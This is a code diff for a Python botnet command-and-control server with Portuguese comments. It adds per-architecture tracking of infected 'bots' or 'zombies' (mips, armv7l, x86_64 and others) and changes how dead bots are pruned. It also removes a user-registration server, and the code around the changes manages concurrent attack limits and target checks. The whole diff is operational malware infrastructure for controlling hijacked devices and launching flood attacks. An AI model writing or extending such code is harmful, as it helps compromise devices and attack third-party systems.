@@ -1,18 +1,25 @@
-import socket
-import threading
-import sys
-import time
-import ipaddress, json
+import ipaddress, time, sys, threading, socket
 from colorama import Fore, init
 
-bots={}
+
 clients={}
 attacks={}
+
+bots={}
+bots_by_arch = {
+    "mips": [],
+    "i386": [],
+    "x86_64": [],
+    "armv7l": [],
+    "armv8l": [],
+    "arch64": [],
+    "unknown": [],
+}
 
 maxAttacks=30
 rootUser='root'
 
-# Não aumente de mais as threads (Você vai foder com seus bots)
+# Não aumente de mais as threads (Você pode foder com seus bots)
 threads=30
 
 ansi_clear = '\033[2J\033[H'
@@ -76,6 +83,26 @@ def botnetMethodsName(method):
 def isBotnetMethod(method):
     return botnetMethodsName(method) != ""
 
+def remove_bot_by_address(address):
+    for arch in bots_by_arch:
+        for bot in bots_by_arch[arch]:
+            client, bot_address = bot
+            if client == address:
+                client.close()
+                bots_by_arch[arch].remove(bot)
+                return
+
+def list_arch_counts(client, send):
+    if not bots_by_arch:
+        send(client, f'{Fore.LIGHTWHITE_EX}\nNo bots :C\n')
+        return
+
+    send(client, f'{C}Connected bots: {G}{len(bots)}\n')
+    send(client, f'{C}Bots Architectures:')
+    for i, (arch, bot_list) in enumerate(bots_by_arch.items(), 1):
+        send(client, f"     {C}{arch}: {G}{len(bot_list)}")
+    send(client, '')
+
 def removeAttacks(username, timeout):
     time.sleep(timeout)
     if username in attacks:
@@ -86,12 +113,11 @@ def checkUserAttack(username):
         return False
     return True
 
-def TargetIsAlreadySent(target, username):
-    for username, info in attacks.items():
+def TargetIsAlreadySent(target, user):
+    for user, info in attacks.items():
         if info['target'] == target:
             return False
     return True
-  
 
 def validate_ip(ip):
     parts = ip.split('.')
@@ -218,7 +244,7 @@ def ping():
         dead_bots = []
         for bot in bots.keys():
             try:
-                bot.settimeout(3)
+                bot.settimeout(5)
                 send(bot, 'PING', False, False)
                 if bot.recv(1024).decode() != 'PONG':
                     dead_bots.append(bot)
@@ -228,6 +254,7 @@ def ping():
         for bot in dead_bots:
             bots.pop(bot)
             bot.close()
+            remove_bot_by_address(bot)
         time.sleep(4)
 
 def update_title(client, name):
@@ -282,15 +309,10 @@ def command_line(client, username):
                 send(client, '')
             
             elif command == 'BOTS' or command == 'ZOMBIES':
-                send(client, f'{C}Connected bots: {G}{len(bots)}\n')
-
-            elif command == '!R' or command == '!REG' or command == '!REGISTER':
-                if username == rootUser:
-                    if len(args) == 1:
-                        threading.Thread(target=reg_main).start()
-                        send(client, f'\n{Fore.CYAN}Started registration server.\n')
-                    else:
-                        send(client, f'\n{Fore.CYAN}Usage: {command}\n')
+                send(client, ansi_clear, False)
+                for x in banner.split('\n'):
+                    send(client, x)
+                list_arch_counts(client, send)
 
             elif command == '!USER' or command == '!U':
                 if username == rootUser:
@@ -403,82 +425,23 @@ def handle_client(client, address):
         threading.Thread(target=update_title, args=(client, username)).start()
         threading.Thread(target=command_line, args=[client, username]).start()
 
+
     # handle bot
     else:
+        bot_arch = username
+        
+        if bot_arch not in bots_by_arch:
+            bot_arch = 'unknown'
+        
         # check if bot is already connected
         for x in bots.values():
             if x[0] == address[0]:
                 client.close()
                 return
+            
         bots.update({client: address})
+        bots_by_arch[bot_arch].append((client, address))
 
-
-def register(client, address, send):
-    ansi_clear = '\033[2J\033[H'
-
-    bannerLogin= f'''{gray}\nYour username must be between 4 and 14 characters,
-and the same applies to the password\n'''
-
-    try:
-        send(client, ansi_clear, False)
-        for x in bannerLogin.split('\n'):
-            send(client, f'{x}')
-        while 1:
-            send(client, f'\x1b{Fore.LIGHTBLUE_EX}Username :\x1b[0m ', False, False)
-            username = client.recv(1024).decode().strip()
-            if not username or len(username) < 4 or len(username) > 14:
-                continue
-            break
-        with open("logins.txt", "r") as logins:
-            lines = logins.readlines()
-            for line in lines:
-                if username in line:
-                    send(client, f'{Fore.RED}User already exists!')
-                    time.sleep(1)
-                    client.close()
-            logins.close()
-        p1 = ''
-        while 1:
-            send(client, f'\033{Fore.LIGHTBLUE_EX}Password :\x1b[0;38;2;0;0;0m ', False, False)
-            while not p1.strip():
-                p1 = client.recv(1024).decode('cp1252').strip()
-            break
-        p2 = ''
-        while 1:
-            send(client, f'\033{Fore.LIGHTBLUE_EX}Confirm password :\x1b[0;38;2;0;0;0m ', False, False)
-            while not p2.strip():
-                p2 = client.recv(1024).decode('cp1252').strip()
-            break
-        while 1:
-                if p1 == p2:
-                    with open("logins.txt", "a") as logins:
-                        logins.write("\n" + username + ':' + p1)
-                    send(client, f"{Fore.LIGHTBLUE_EX}\nRegistered!")
-                    print(f'Novo usuario: {username} : {p1}')
-                    time.sleep(2)
-                else:
-                    send(client, "Failed password authentication...")
-                break
-    except:
-        send(client, "Error.")
-
-def reg_main():
-    with open("config.json") as jsonFile:
-        jsonObject = json.load(jsonFile)
-        jsonFile.close()
-    reg_port = int(jsonObject['reg_port'])
-    reg_host = jsonObject['reg_host']
-    init(convert=True)
-    sock = socket.socket()
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    try:
-        sock.bind((reg_host, reg_port))
-    except:
-        print('\x1b[3;31;40m Failed to bind port')
-        exit()
-    sock.listen()
-    threading.Thread(target=register, args=[*sock.accept(), send]).start()
 
 def main():
     if len(sys.argv) != 2:
